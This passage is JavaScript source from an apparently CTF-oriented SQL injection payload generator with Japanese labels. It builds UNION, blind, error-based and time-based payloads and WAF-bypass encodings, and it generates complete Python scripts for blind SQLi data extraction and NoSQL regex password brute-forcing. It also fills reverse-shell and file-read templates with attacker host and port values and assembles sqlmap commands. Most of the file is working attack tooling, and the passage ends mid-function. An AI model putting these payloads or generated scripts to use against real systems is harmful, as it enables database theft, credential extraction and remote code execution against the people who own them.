    {t:"複数行: 一括 group_concat (MySQL)",db:"MySQL",p:P+" UNION SELECT "+nullList(n,echo,"(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())")+(C?" "+C:""),n:"長いと group_concat_max_len (初期1024) で切れる → substr で分割。"}
  ],enc);

  unDump(P,C,n,echo,db,dual,enc);  renderCards("un-nois",[
    {t:"代替スキーマ参照",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.tablesAlt))+dual+(C?" "+C:""),n:db.tablesAltNote},
    {t:"JOIN でカラム名を暴く (MySQL)",db:"MySQL",p:P+" UNION SELECT * FROM (SELECT * FROM users JOIN users b)a"+(C?" "+C:""),n:"Duplicate column 'id' エラーが列名を1個ずつ漏らす。USING(id) で次々に。",hard:true},
    {t:"カラム名なしで中身を抽出 (MySQL)",db:"MySQL",p:P+" UNION SELECT NULL,(SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)x LIMIT 1,1),NULL"+(C?" "+C:""),n:"位置バッククォートで型さえ合えば抜ける。数字列は該当位置の番号で。",hard:true}
  ],enc);
  renderXenum();
}

function unDump(P,C,n,echo,db,dual,enc){
  const T=$("un-table").value.trim()||"users";
  const C1=$("un-col").value.trim()||"password";
  const C2=($("un-col2")||{value:""}).value.trim();
  const Wraw=$("un-where").value.trim();
  const W=Wraw?(" WHERE "+Wraw):"";
  const hexT=hexLit(T);
  const out=[];
  out.push({t:"テーブル一覧",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.tables))+dual+(C?" "+C:"")});
  if(hexT) out.push({t:"カラム一覧 (テーブル名 hex指定)",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.cols.replace("{T}",hexT)))+dual+(C?" "+C:""),n:"引用符が消せる形。"});
  out.push({t:"カラム一覧 (テーブル名 クォート指定)",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.cols.replace("{T}","'"+T+"'")))+dual+(C?" "+C:"")});
  const d2=C2?db.dump2:db.dump1;
  out.push({t:C2?"データ抽出 (2列連結)":"データ抽出 (1列)",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(d2.replace(/\{C1\}/g,C1).replace(/\{C2\}/g,C2||C1).replace(/\{T\}/g,T).replace(/\{W\}/g,W)))+dual+(C?" "+C:""),n:Wraw?"WHERE句あり。行が複数なら group_concat/集約に任せる。":"全行が集約されて出る。特定行のみなら検索条件を入れる。"});
  renderCards("un-dump",out,enc);
}

function unWordlist(){
  const target=$("un-wl-target").value;
  const mode=$("un-wl-mode").value;
  const P=PFX($("un-prefix").value);
  const C=$("un-comment").value;
  const list=target==="table"?WORD_TABLES:WORD_COLS;
  const rows=[];
  if(mode==="exists"){
    if(target==="table"){
      for(const w of list) rows.push(P+" UNION SELECT 1,'"+w+"',3 FROM "+w+(C?" "+C:""));
    }else{
      for(const w of list) rows.push(P+" UNION SELECT 1,"+w+",3 FROM users"+(C?" "+C:""));
    }
  }else{
    const letters="abcdefghijklmnopqrstuvwxyz0123456789_";
    if(target==="table"){
      for(const L of letters) rows.push(P+" AND (SELECT count(*) FROM information_schema.tables WHERE table_name LIKE '"+L+"%')>0"+(C?" "+C:""));
    }else{
      for(const L of letters) rows.push(P+" AND (SELECT count(*) FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '"+L+"%')>0"+(C?" "+C:""));
    }
  }
  const t=fx(rows.join("\n"));
  const det=t.changed?'<details class="fxdet"><summary>変換ログ ('+t.steps.length+'件)</summary>'+t.steps.map(s=>'<div class="step">✔ '+s+'</div>').join("")+t.warns.map(w=>'<div class="step warn">⚠ '+w+'</div>').join("")+'</details>':"";
  $("un-wordlist").innerHTML='<div class="card"><div class="card-title">'+rows.length+'件生成 ('+(target==="table"?"テーブル":"カラム")+'名 / '+(mode==="exists"?"存在チェック":"LIKE先頭文字")+')'+(t.changed?' <span class="badge auto">自動バイパス済</span>':"")+'</div><pre class="payload">'+esc(t.final)+'</pre>'+btnRow(t.final,rows.join("\n"))+det+'</div>';
}

function blindExpr(){
  const db=DB[$("bl-dbms").value];
  const col=$("bl-col").value.trim()||"pw";
  const table=$("bl-table").value.trim()||"members";
  const where=$("bl-where").value.trim();
  const row=parseInt($("bl-row").value||"0",10);
  let inner="SELECT "+col+" FROM "+table+(where?" WHERE "+where:"");
  if(db===DB.mysql) inner+=" LIMIT "+row+",1";
  else if(db===DB.mssql) inner="SELECT TOP 1 "+col+" FROM "+table+(where?" WHERE "+where:"");
  else if(db===DB.oracle) inner="SELECT "+col+" FROM "+table+(where?" WHERE "+where:"")+(where?" AND":" WHERE")+" ROWNUM="+(row+1);
  else inner+=" LIMIT 1 OFFSET "+row;
  return {db:db,E:"("+inner+")"};
}

function renderBlind(){
  const {db,E}=blindExpr();
  const P=PFX($("bl-prefix").value);
  const C=$("bl-comment").value;
  const enc=(($("bl-enc")||{})||{}).checked;
  const cS=C?" "+C:"";
  const LEN=db.lengthFn, SUB=db.subFn, ASC=db.asciiFn;
  renderCards("bl-length",[
    {t:"長さ 等値",p:P+" AND "+LEN+"("+E+")=8"+cS,n:"8 を変えて総当たり。"},
    {t:"長さ 二分探索",p:P+" AND "+LEN+"("+E+")>4"+cS,n:"7リクエスト/文字 → スクリプト生成を使う。"},
    {t:"長さ LIKE _ 個数",p:P+" AND "+E+" LIKE '________'"+cS,n:"アンダースコア8個 = 長さ8確定テク (substr不要)。"}
  ],enc);
  renderCards("bl-char",[
    {t:"1文字 等値 (ascii)",p:P+" AND "+ASC+"("+SUB+"("+E+",1,1))=97"+cS,n:db===DB.sqlite?"SQLite は ascii() が無いので unicode()。":"97='a'。97→98…と総当たり。"},
    {t:"1文字 二分探索",p:P+" AND "+ASC+"("+SUB+"("+E+",1,1))>64"+cS,n:"二分なら7リクエスト/文字。"},
    {t:"LIKE 前方一致 (substr不要)",p:P+" AND "+E+" LIKE 'a%'"+cS,n:"substr/ascii が拒否されてる時の主力。"},
    {t:"LIKE hex (引用符不要)",p:P+" AND "+E+" LIKE 0x6125"+cS,n:"0x6125 = 'a%'。"},
    {t:"RLIKE 正規表現",p:P+" AND "+E+" RLIKE '^a'"+cS,n:"MySQL。PG は ~ 演算子。"},
    {t:"HEX比較 (ascii不要)",p:P+" AND (SELECT HEX("+SUB+"("+E+",1,1)))=0x61"+cS,n:"16進2桁を等値で。"}
  ],enc);
  const tm=[];
  if(db.timeIf) tm.push({t:"時間盲注 (条件付き遅延)",p:P+" AND "+db.timeIf.replace("{COND}","1=1")+cS,n:"COND に文字判定式を入れる。例: "+ASC+"("+SUB+"("+E+",1,1))=97"});
  else tm.push({t:"時間盲注 (スタックド必須)",p:P+"; IF (1=1) WAITFOR DELAY '0:0:5'"+cS,n:"MSSQL は ; スタックで。COND: IF (ascii(...) = 97) WAITFOR ..."});
  tm.push({t:"遅延代替",p:P+" AND "+db.timeAlt.replace("{COND}","1=1")+cS,n:"SLEEP が禁止されている時の代替遅延。"});
  renderCards("bl-time",tm,enc);
  genScript(false);
}

function genScript(show){
  const {db,E}=blindExpr();
  const P=PFX($("bl-prefix").value);
  const C=$("bl-comment").value;
  const cS=C?" "+C:"";
  const url=$("sc-url").value.trim()||"http://localhost:8080/?no=";
  const param=$("sc-param").value.trim()||"no";
  const reqtype=$("sc-reqtype").value;
  const hdrname=$("sc-hdrname").value.trim()||"X-Forwarded-For";
  const judge=$("sc-mode").value;
  const marker=($("sc-marker").value||"").replace(/\\/g,"\\\\").replace(/"/g,'\\"');
  const delay=parseInt($("sc-delay").value||"3",10);
  const lengt=parseInt($("sc-len").value||"1000",10);
  const threads=Math.max(1,Math.min(16,parseInt($("sc-threads").value||"4",10)));
  const wide=$("sc-range").value==="wide";
  const hdrRaw=($("sc-headers").value||"").trim();
  const second=($("sc-second").value||"").trim().replace(/\\/g,"\\\\").replace(/"/g,'\\"');
  let pyHeaders="{}";
  if(hdrRaw){
    const lines=hdrRaw.split("\n").map(x=>x.trim()).filter(Boolean);
    pyHeaders="{"+lines.map(l=>{
      const i=l.indexOf(":");
      const k=(i<0?l:l.slice(0,i).trim()).replace(/"/g,'\\"');
      const v=(i<0?"":l.slice(i+1).trim()).replace(/"/g,'\\"');
      return '"'+k+'": "'+v+'"';
    }).join(", ")+"}";
  }
  const LENP=fx(" AND "+db.lengthFn+"("+E+"){CMP} {N}"+cS).final;
  const CHRP=fx(" AND "+db.asciiFn+"("+db.subFn+"("+E+",{POS},1)){CMP}{N}"+cS).final;
  const tpl=String.raw`#!/usr/bin/env python3
import requests, time, sys, threading
from concurrent.futures import ThreadPoolExecutor

URL = "__URL__"
PARAM = "__PARAM__"
REQ = "__REQ__"
HEADER_NAME = "__HDRNAME__"
JUDGE = "__JUDGE__"
MARKER = "__MARKER__"
DELAY = __DELAY__
LEN_GT = __LENGTHT__
THREADS = __THREADS__
LEN_PAYLOAD = "__LENP__"
CHR_PAYLOAD = "__CHARP__"
CHAR_LO = __LO__
CHAR_HI = __HI__
EXTRA_HEADERS = __HEADERS__
SECOND_URL = "__SECOND__"

_tl = threading.local()

def sess():
    if not hasattr(_tl, "s"):
        _tl.s = requests.Session()
        _tl.s.headers.update(EXTRA_HEADERS)
    return _tl.s

def send(payload):
    t0 = time.time()
    if REQ == "GET":
        r = sess().get(URL, params={PARAM: payload}, timeout=60)
    elif REQ == "POST":
        r = sess().post(URL, data={PARAM: payload}, timeout=60)
    elif REQ == "JSON":
        r = sess().post(URL, json={PARAM: payload}, timeout=60)
    else:
        h = dict(sess().headers)
        h[HEADER_NAME] = payload
        r = sess().get(URL, headers=h, timeout=60)
    return r, time.time() - t0

def judge(r, elapsed):
    if JUDGE == "time":
        return elapsed >= DELAY
    if JUDGE == "out":
        return MARKER not in r.text
    if JUDGE == "len":
        return len(r.content) > LEN_GT
    return MARKER in r.text

def ask(payload):
    for _ in range(3):
        try:
            r, el = send(payload)
            if SECOND_URL:
                r = sess().get(SECOND_URL, timeout=60)
            return judge(r, el)
        except requests.RequestException:
            time.sleep(1)
    raise SystemExit("[!] requests failed repeatedly - check target/filter")

def ask_len(n, cmp="="):
    return ask(LEN_PAYLOAD.replace("{CMP}", cmp).replace("{N}", str(n)))

def ask_chr(pos, n, cmp="="):
    return ask(CHR_PAYLOAD.replace("{POS}", str(pos)).replace("{CMP}", cmp).replace("{N}", str(n)))

def find_length():
    hi = 8
    while ask_len(hi, ">"):
        hi *= 2
        if hi > 8192:
            raise SystemExit("[!] length overflow")
    lo = 1
    while lo < hi:
        mid = (lo + hi) // 2
        if ask_len(mid, ">"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def find_char(pos):
    lo, hi = CHAR_LO, CHAR_HI
    while lo < hi:
        mid = (lo + hi) // 2
        if ask_chr(pos, mid, ">"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def job(pos):
    c = find_char(pos)
    print("[*] pos %d -> 0x%02x" % (pos, c), flush=True)
    return pos, c

def main():
    print("[*] binary-searching value length ...")
    L = find_length()
    print("[+] length =", L, "| threads =", THREADS)
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        got = dict(ex.map(job, range(1, L + 1)))
    result = "".join(chr(got[i]) for i in range(1, L + 1))
    print("\n[RESULT]", result)
    if any(ord(x) > 126 for x in result):
        print("[HEX]  ", "".join("%02x" % ord(x) for x in result))
        print("[*] >0x7e bytes detected. decode: bytes.fromhex(hexstr).decode('utf-8', errors='replace')")

if __name__ == "__main__":
    main()
`;
  const script=tpl
    .replace(/__URL__/g,url).replace(/__PARAM__/g,param).replace(/__REQ__/g,reqtype)
    .replace(/__HDRNAME__/g,hdrname).replace(/__JUDGE__/g,judge).replace(/__MARKER__/g,marker)
    .replace(/__DELAY__/g,String(delay)).replace(/__LENGTHT__/g,String(lengt))
    .replace(/__THREADS__/g,String(threads)).replace(/__HEADERS__/g,pyHeaders).replace(/__SECOND__/g,second)
    .replace(/__LENP__/g,LENP.replace(/"/g,'\\"')).replace(/__CHARP__/g,CHRP.replace(/"/g,'\\"'))
    .replace(/__LO__/g,"32").replace(/__HI__/g,wide?"255":"126");
  $("sc-out").textContent=script;
  window.SQLIFORGE._lastScript=script;
  if(show) toast("スクリプト生成しました");
}

function renderErrors(){
  const key=$("er-dbms").value;
  const P=PFX($("er-prefix").value);
  const C=$("er-comment").value;
  const items=ERRORS[key].map(e=>{
    let p=e.p.replace(/^1/,P);
    p=p.replace(/-- -$/,C||"-- -").replace(/--$/,C||"--");
    return {t:e.t,p:p,n:e.n,db:DB[key].name};
  });
  renderCards("er-cards",items);
}

function renderChips(){
  $("bp-chips").innerHTML=FILTERS.map(f=>'<button type="button" class="chip'+(active.has(f.id)?" on":"")+'" data-f="'+f.id+'" aria-pressed="'+(active.has(f.id)?"true":"false")+'" title="'+esc(f.desc)+'">'+esc(f.label)+'</button>').join("");
  document.querySelectorAll("#bp-chips .chip").forEach(ch=>ch.addEventListener("click",()=>{
    const id=ch.dataset.f;
    if(active.has(id)) active.delete(id); else active.add(id);
    renderChips();
    refreshAll();
  }));
}

function renderStrips(){
  const list=["fs-detect","fs-union","fs-error","fs-blind"];
  let inner;
  if(!active.size){
    inner='<span class="fs-ok">生ペイロード出力中</span>'
      +'<span class="fs-note">サニタイズ / ブラックリストがある問題はフィルタを設定すると、このタブの全ペイロードを自動変換します</span>'
      +'<button type="button" class="btn tiny" onclick="SQLIFORGE.go(\'bypass\')">フィルタを設定</button>';
  }else{
    const names=[...active].map(id=>{const f=FILTERS.find(x=>x.id===id);return f?f.label:id;}).join(" · ");
    const mv=$("bp-mode").value;
    const mode=mv==="replace"?"str_replace型":(mv==="waf"?"WAF":"preg_match型");
    inner='<span class="fs-on">自動バイパス適用中</span>'
      +'<span class="fs-note">'+esc(names)+' ('+mode+')</span>'
      +'<button type="button" class="btn tiny" onclick="SQLIFORGE.go(\'bypass\')">編集</button>'
      +'<button type="button" class="btn tiny" onclick="SQLIFORGE.clearFilters()">解除</button>';
  }
  list.forEach(id=>{ const el=$(id); if(el){ el.innerHTML=inner; el.classList.toggle("on-state",active.size>0); } });
}

function updateNavBadge(){
  const b=$("nav-fcount");
  if(!b) return;
  if(active.size){ b.hidden=false; b.textContent=active.size; }
  else b.hidden=true;
}

function refreshAll(){
  renderDetect();
  renderDetectStatic();
  unBuild();
  renderBlind();
  renderErrors();
  renderStrips();
  updateNavBadge();
  runBypass();
}

function runBypass(){
  const input=$("bp-input").value.trim();
  if(!input){ $("bp-out").textContent=""; return; }
  const res=applyFilters(input,active,$("bp-mode").value,customBans);
  $("bp-out").textContent=res.out||input;
  $("bp-out-enc").textContent=urlEnc(res.out||input);
  const steps=[...res.steps.map(s=>'<div class="step">✔ '+s+'</div>'),...res.warns.map(w=>'<div class="step warn">⚠ '+w+'</div>')];
  $("bp-steps").innerHTML=steps.join("")||'<div class="step">フィルタ未選択: チップを選ぶと変換されます</div>';
  renderCards("bp-variants",res.variants.map(v=>({t:v.t,p:v.p})));
}

function runAnalyze(){
  const src=$("bp-src").value;
  if(!src.trim()){ $("bp-analyze-out").innerHTML='<div class="anz"><span class="warn">ソースを貼ってください</span></div>'; return; }
  const res=analyzeSource(src);
  active.clear();
  res.chips.forEach(c=>active.add(c));
  if(res.mode) $("bp-mode").value=res.mode;
  renderChips();
  refreshAll();
  const html=res.items.map(i=>'<div class="anz"><span class="'+i.sev+'">'+(i.sev==="ok"?"✔":i.sev==="warn"?"⚠":"✖")+" "+esc(i.msg)+'</span>'
    +(i.advice&&i.advice.length?'<ul>'+i.advice.map(a=>"<li>"+esc(a)+"</li>").join("")+"</ul>":"")+'</div>').join("");
  $("bp-analyze-out").innerHTML=html||'<div class="anz"><span class="ok">✔ 既知のフィルタ/サニタイザは検出されませんでした</span></div>'
    +'<div class="anz">検出されたチップをセットしました → 左側で「変換」を押してください。</div>';
  toast(res.chips.length+"個のフィルタを自動設定しました (全タブに反映)");
}

function renderTools(){
  const s=$("tl-input").value;
  const outs=[
    {t:"URLエンコード (完全)",p:urlEnc(s),n:"クエリパラメータにそのまま。"},
    {t:"URLエンコード (2重)",p:urlEnc(urlEnc(s)),n:"サーバが2回デコードする実装/WAF迂回用。"},
    {t:"MySQL 16進リテラル",p:hexLit(s)||"(変換不能: 非ラテン1文字)",n:"引用符なしで文字列を表現。"},
    {t:"CHAR() 関数",p:"CHAR("+[...s].map(c=>c.codePointAt(0)).join(",")+")",n:"カンマが使える時の代替。"},
    {t:"Base64",p:b64(s),n:"バイパス以外にもBURP Intruderのペイロード処理等に。"},
    {t:"Unicodeエスケープ (\\u)",p:[...s].map(c=>"\\u"+c.codePointAt(0).toString(16).padStart(4,"0")).join(""),n:"JSON文脈等。"},
    {t:"HTMLエンティティ",p:s.replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[c])),n:"XSS文脈確認用。"},
    {t:"ランダムケース",p:randomCase(s),n:"SELECT → SeLeCt。引用符内は保持。/i が無い正規表現やWAF向け。"},
    {t:"先頭大文字化 (Union Select)",p:caseCap(s),n:"UNION と union だけ完全一致で拒否するフィルタ (strpos系/i無しpreg) の回避。引用符内と 0x 接頭辞は保持。"},
    {t:"交互ケース (UnIoN sElEcT)",p:altCase(s),n:"区別一致ブラックリスト回避の変奏。"},
    {t:"全小文字化 (大文字拒否対策)",p:caseShift(s,"lower"),n:"引用符内と 0x 接頭辞は保持。"},
    {t:"全大文字化 (小文字拒否対策)",p:caseShift(s,"upper"),n:"引用符内と 0x 接頭辞は保持。SQLキーワード大文字は全DBMSで有効。"},
    {t:"コメント分割",p:s.replace(/\s+/g,"/**/").replace(/\b(union|select|from|where|and|or)\b/gi,w=>w[0]+"/**/"+w.slice(1)),n:"WAF迂回 (アプリ側でデコード後は元に戻るので正規表現拒否にも有効)。"}
  ];
  renderCards("tl-outputs",outs.map(o=>({t:o.t,p:o.p,n:o.n})));
  $("tl-spaces").innerHTML=tblHTML(["代替","名前","備考"],SPACES.map(r=>[esc(r[0]),esc(r[1]),esc(r[2])]));
  $("tl-commas").innerHTML=tblHTML(["カンマあり → なし","内容","備考"],COMMAS.map(r=>[esc(r[0]),esc(r[1]),esc(r[2])]));
  $("tl-eqs").innerHTML=tblHTML(["演算子","例","備考"],EQS.map(r=>[esc(r[0]),'<code>'+esc(r[1])+'</code>',esc(r[2])]));
  $("tl-concats").innerHTML=tblHTML(["DBMS","連結","備告"],CONCATS.map(r=>[esc(r[0]),'<code>'+esc(r[1])+'</code>',esc(r[2])]));
}

function genCurl(){
  const url=$("cu-url").value.trim();
  const key=$("cu-param").value.trim()||"id";
  const payload=$("cu-payload").value;
  const method=$("cu-method").value;
  let out;
  if(method==="GET"){
    out='# GET (自動エンコード)\ncurl -G "'+url+'" --data-urlencode "'+key+'='+payload.replace(/"/g,'\\"')+'"\n\n# GET (手動URL)\ncurl "'+url+'?'+key+'='+urlEnc(payload)+'"\n\n# GET (生ペイロードをburpで)\n# '+url+'?'+key+'=PAYLOAD_RAW';
  }else{
    out='curl -X POST "'+url+'" -d "'+key+'='+urlEnc(payload)+'" -H "Content-Type: application/x-www-form-urlencoded"';
  }
  $("cu-out").textContent=out;
}

function renderCheat(q){
  const query=(q||"").toLowerCase();
  const list=CHEATS.filter(c=>{
    if(!query) return true;
    const hay=(c.t+" "+c.k+" "+c.d+" "+(c.p||[]).join(" ")).toLowerCase();
    return hay.includes(query);
  });
  $("ch-list").innerHTML=list.map(c=>'<div class="cheat-sec"><h4>'+esc(c.t)+'</h4><div class="cheat-body">'+c.d
    +(c.p&&c.p.length?'<div class="payload">'+esc(c.p.join("\n"))+'</div><div class="btnrow"><button class="btn tiny" onclick="SQLIFORGE.cp(this)" data-v="'+esc(c.p.join("\n"))+'">全ペイロード コピー</button></div>':"")
    +'</div></div>').join("")||'<div class="anz"><span class="warn">該当なし</span></div>';
}

function renderNosql(){
  renderCards("ns-detect",NOSQL.detect.map(d=>({t:d.t,p:d.p,n:d.n})));
  renderCards("ns-auth",NOSQL.auth.map(d=>({t:d.t,p:d.p,n:d.n})));
  renderCards("ns-blind",NOSQL.blind.map(d=>({t:d.t,p:d.p,n:d.n})));
}

function genNosqlScript(show){
  const url=$("ns-url").value.trim()||"http://localhost:8081/login";
  const up=$("ns-up").value.trim()||"username";
  const pp=$("ns-pp").value.trim()||"password";
  const un=$("ns-user").value.trim()||"admin";
  const req=$("ns-req").value;
  const marker=($("ns-marker").value||"login ok").replace(/\\/g,"\\\\").replace(/"/g,'\\"');
  const tpl=String.raw`#!/usr/bin/env python3
import requests, string, sys

URL = "__URL__"
USER_PARAM = "__UP__"
PASS_PARAM = "__PP__"
USERNAME = "__UN__"
REQ = "__REQTYPE__"
MARKER = "__MARKER__"
CHARSET = "".join(c for c in string.printable[:95] if c not in "*+.?|#$&%^()[]{}\\/")

def try_pass(p):
    if REQ == "JSON":
        body = {USER_PARAM: {"$eq": USERNAME}, PASS_PARAM: {"$regex": "^" + p}}
        r = requests.post(URL, json=body, timeout=30)
    elif REQ == "POST":
        body = {USER_PARAM: USERNAME, PASS_PARAM + "[$regex]": "^" + p}
        r = requests.post(URL, data=body, timeout=30)
    else:
        r = requests.get(URL, params={USER_PARAM: USERNAME, PASS_PARAM + "[$regex]": "^" + p}, timeout=30)
    return MARKER in r.text

def main():
    known = ""
    while len(known) < 64:
        found = False
        for c in CHARSET:
            if try_pass(known + c):
                known += c
                print("[*] " + known, flush=True)
                found = True
                break
        if not found:
            break
    print("\n[RESULT]", known)

if __name__ == "__main__":
    main()
`;
  const script=tpl.replace(/__URL__/g,url).replace(/__UP__/g,up).replace(/__PP__/g,pp)
    .replace(/__UN__/g,un).replace(/__REQTYPE__/g,req).replace(/__MARKER__/g,marker);
  $("ns-out").textContent=script;
  window.SQLIFORGE._lastNosql=script;
  if(show) toast("NoSQLスクリプト生成しました");
}

function renderCtx(){
  const key=$("un-ctx").value;
  renderCards("un-ctx-cards",(CTXS[key]||[]).map(c=>({t:c.t,p:c.p,n:c.n})));
}

function renderXenum(){
  const db=DB[$("un-dbms").value];
  const K=($("un-keyword").value||"flag").trim();
  const Ku=K.toUpperCase();
  const n=Math.max(1,Math.min(40,parseInt($("un-cols").value||"4",10)));
  const echo=Math.max(1,Math.min(n,parseInt($("un-echo").value||"2",10)));
  const P=PFX($("un-prefix").value);
  const C=$("un-comment").value;
  const dual=db.needsDual?" FROM dual":"";
  const items=(XENUM[$("un-dbms").value]||[]).map(e=>({
    t:e.t,
    p:P+" UNION SELECT "+nullList(n,echo,wrapSub(e.x.replace(/\{K\}/g,db===DB.oracle?Ku:K)))+dual+(C?" "+C:""),
    n:e.n, db:db.name, hard:e.hard
  }));
  renderCards("un-xenum",items,($("un-urlenc")||{}).checked);
}

function renderRce(){
  const key=$("rc-dbms").value;
  const host=$("rc-host").value.trim()||"10.10.14.1";
  const port=$("rc-port").value.trim()||"4444";
  const domain=$("rc-domain").value.trim()||"xxxx.dnslog.cn";
  const path=($("rc-path").value.trim()||"/var/www/html").replace(/\/+$/,"");
  const items=(RCE_TPL[key]||[]).map(t=>({
    t:t.t,
    p:t.p.replace(/\{HOST\}/g,host).replace(/\{PORT\}/g,port).replace(/\{DOMAIN\}/g,domain).replace(/\{PATH\}/g,path),
    n:t.n, db:DB[key].name
  }));
  renderCards("rc-cards",items);
  renderCards("rc-read",(FILEREAD[key]||[]).map(t=>({t:t.t,p:t.x,n:t.n,db:DB[key].name})));
  $("rc-stacked").innerHTML=tblHTML(["環境","スタックド (;) 可否","備考"],[
    ["PostgreSQL","可","ドライバ標準。COPY TO PROGRAM が強い。"],
    ["MSSQL","可","ドライバ標準。xp_cmdshell でRCE。"],
    ["MySQL","基本不可","PHP mysqli_multi_query / PDOエミュレーションON のみ可。"],
    ["SQLite","条件付き可","PHP PDO で可な場合あり。ATTACHでシェル。"],
    ["Oracle","不可","PL/SQLブロック除く。OOB主体。"]
  ]);
}

function renderProbes(){
  $("bp-probes").innerHTML=FILTER_PROBES.map((f,i)=>'<div class="card">'
    +'<div class="card-title"><input type="checkbox" data-chip="'+f.chip+'" id="bpv'+i+'"> <label for="bpv'+i+'" style="cursor:pointer">'+esc(f.label)+'</label></div>'
    +'<div class="payload">'+esc(f.p)+'</div>'
    +'<div class="card-note">ブロックされたらチェック → chip: '+esc(f.chip)+'</div>'
    +'</div>').join("");
}

function applyProbes(){
  const checked=[...document.querySelectorAll("#bp-probes input[type=checkbox]:checked")].map(c=>c.dataset.chip);
  checked.forEach(c=>active.add(c));
  renderChips();
  refreshAll();
  toast(checked.length+"個のフィルタを反映しました");
}

function genSqlmap(){
  const url=$("sm-url").value.trim();
  const param=$("sm-param").value.trim()||"id";
  const method=$("sm-method").value;
  const tampers=[];
  const notes=[];
  for(const m of SQLMAP_TAMPERS){
    if(m.ids.some(id=>active.has(id))){
      m.tampers.forEach(t=>{ if(!tampers.includes(t)) tampers.push(t); });
      if(!m.tampers.length) notes.push(m.note);
    }
  }
  if(active.size&&!tampers.includes("randomcase")) tampers.push("randomcase");
  let cmd;
  if(method==="POST"){
    cmd='sqlmap -u "'+url+'" --data "'+param+'=1" -p '+param;
  }else{
    cmd='sqlmap -u "'+url+'" -p '+param;
  }
  cmd+=' --batch --level=3 --risk=2';
  if(tampers.length) cmd+=' --tamper='+tampers.join(",");
  let out=cmd+"\n\n# 認証/ヘッダー付き題材は Burp でリクエスト保存 → sqlmap -r req.txt -p "+param;
  if(notes.length) out+="\n# 注意: "+notes.join(" / ");
  out+="\n# 技法指定: --technique=BEU (Boolean/Error/Union) / --technique=BT (盲注のみ) / --time-sec=5";
  $("sm-out").textContent=out;
}

let wz={node:"q_detect",path:[],values:{}};

function wzApplyBlind(timeMode){
  const dbms=$("wiz-dbms").value;
  const v=id=>(wz.values[id]!==undefined&&wz.values[id]!=="")?wz.values[id]:(WIZARD.f_bool.fields.concat(WIZARD.f_time.fields).find(f=>f.id===id)||{val:""}).val;
  $("bl-dbms").value=dbms;
  $("bl-col").value=v("wz-col");
  $("bl-table").value=v("wz-table");
  $("bl-where").value=v("wz-where");
  $("sc-mode").value=timeMode?"time":(v("wz-judge")||"in");
  if(timeMode&&$("wz-delay")) $("sc-delay").value=parseInt(v("wz-delay")||"3",10)||3;
  renderBlind();
  switchTab("blind");
  toast("盲注設定へ転記しました — スクリプト生成へ");
}

const WZ_ACT={
  detect:()=>switchTab("detect"),
  cheat:()=>switchTab("cheat"),
  rce:()=>switchTab("rce"),
  bypass:()=>switchTab("bypass"),
  bypassUS:()=>{ active.add("union"); active.add("select"); renderChips(); refreshAll(); switchTab("bypass"); toast("union+select フィルタをセットしました"); },
  union:()=>{
    $("un-dbms").value=$("wiz-dbms").value;
    $("un-cols").value=parseInt(wz.values["wz-cols"]||"4",10)||4;
    $("un-echo").value=parseInt(wz.values["wz-echo"]||"2",10)||2;
    unBuild();
    switchTab("union");
    toast("UNIONビルダーへ転記しました");
  },
  error:()=>{
    $("er-dbms").value=$("wiz-dbms").value;
    renderErrors();
    switchTab("error");
    toast("エラーベースタブへ (DBMS設定済み)");
  },
  blind:()=>wzApplyBlind(false),
  timeblind:()=>wzApplyBlind(true)
};

function wzGo(next,tag){
  wz.path.push({tag:tag,node:wz.node});
  wz.node=next;
  renderWizard();
}

function wzRestart(){
  wz={node:"q_detect",path:[],values:{}};
  renderWizard();
}

function renderWizard(){
  const p=$("wz-path"),b=$("wz-body");
  if(!p||!b) return;
  p.innerHTML=wz.path.length
    ? wz.path.map((x,i)=>'<button type="button" class="wz-tag" data-i="'+i+'" title="ここまで戻る">› '+esc(x.tag)+'</button>').join(" ")
    : '<span class="wz-hint">質問に答えると最適な技法とペイロード生成先を提案します (タグをクリックで巻き戻し)</span>';
  p.querySelectorAll(".wz-tag").forEach(t=>t.addEventListener("click",()=>{
    const i=parseInt(t.dataset.i,10);
    wz.node=wz.path[i].node;
    wz.path=wz.path.slice(0,i);
    renderWizard();
  }));
  const n=WIZARD[wz.node];
  if(!n){ b.innerHTML=""; return; }
  if(n.opts){
    b.innerHTML='<div class="wz-q">'+esc(n.q)+'</div><div class="wz-opts">'
      +n.opts.map((o,i)=>'<button type="button" class="wz-opt'+(i===0?" yes":"")+'" data-next="'+o.next+'" data-tag="'+esc(o.tag)+'">'+esc(o.t)+'</button>').join("")
      +'</div>';
    b.querySelectorAll(".wz-opt").forEach(btn=>btn.addEventListener("click",()=>wzGo(btn.dataset.next,btn.dataset.tag)));
  }else if(n.form){
    const fields=n.fields.map(f=>{
      const cur=wz.values[f.id]!==undefined?wz.values[f.id]:f.val;
      let inp;
      if(f.type==="select") inp='<select id="'+f.id+'">'+f.opts.map(o=>'<option value="'+o[0]+'"'+(o[0]===cur?" selected":"")+'>'+esc(o[1])+'</option>').join("")+'</select>';
      else inp='<input type="'+(f.type==="num"?"number":"text")+'" id="'+f.id+'" value="'+esc(cur)+'">';
      return '<div class="wz-field"><label for="'+f.id+'">'+esc(f.label)+'</label>'+inp+'</div>';
    }).join("");
    b.innerHTML='<div class="wz-q">'+esc(n.form)+'</div><div class="wz-form">'+fields+'</div>'
      +'<button type="button" class="btn primary wz-cta" id="wz-cta">'+esc(n.cta.t)+'</button>'
      +(n.note?'<div class="wz-note">'+esc(n.note)+'</div>':"");
    b.querySelectorAll(".wz-field input,.wz-field select").forEach(el=>{
      el.addEventListener("input",()=>{ wz.values[el.id]=el.value; });
      el.addEventListener("change",()=>{ wz.values[el.id]=el.value; });
    });
    const cta=$("wz-cta");
    if(cta) cta.addEventListener("click",()=>WZ_ACT[n.cta.act]());
  }else if(n.end){
    b.innerHTML='<div class="wz-q">'+esc(n.end)+'</div><div class="wz-tech">推定: '+esc(n.tech)+'</div>'
